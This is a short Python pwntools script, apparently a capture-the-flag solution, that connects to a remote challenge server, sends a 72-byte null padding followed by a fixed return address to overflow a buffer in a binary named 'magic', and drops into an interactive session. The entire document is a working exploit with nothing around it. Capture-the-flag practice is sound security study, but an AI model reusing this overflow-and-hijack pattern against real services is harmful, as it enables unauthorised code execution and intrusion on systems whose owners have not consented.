#!/usr/bin/env python

from pwn import *

magic = 0x8048613

r = remote("bamboofox.cs.nctu.edu.tw", 10000)
#r = process('./magic')

r.recvuntil(':')
r.sendline('a')
r.recvuntil(':')

r.sendline('\x00' * 72 + p32(magic))

r.interactive()
